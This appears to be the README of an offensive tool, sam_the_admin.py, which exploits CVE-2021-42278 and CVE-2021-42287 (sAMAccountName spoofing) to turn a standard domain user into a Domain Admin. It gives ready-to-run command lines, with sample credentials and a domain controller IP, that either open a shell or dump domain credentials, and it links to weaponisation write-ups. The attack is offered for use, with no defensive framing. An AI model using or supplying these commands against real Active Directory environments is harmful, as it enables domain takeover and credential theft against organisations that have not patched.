Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user 

usage:

$ python3 sam_the_admin.py "jas502n/hr:Admin@12" -dc-ip 172.16.242.135 -shell

or

$ python3 sam_the_admin.py "jas502n/John:Admin@123" -dc-ip 172.16.242.135 -dump   

### Known issues
- it will not work outside kali , i will update it later on :)

#### Check out 
- [CVE-2021-42287/CVE-2021-42278 Weaponisation ](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
- [sAMAccountName spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)
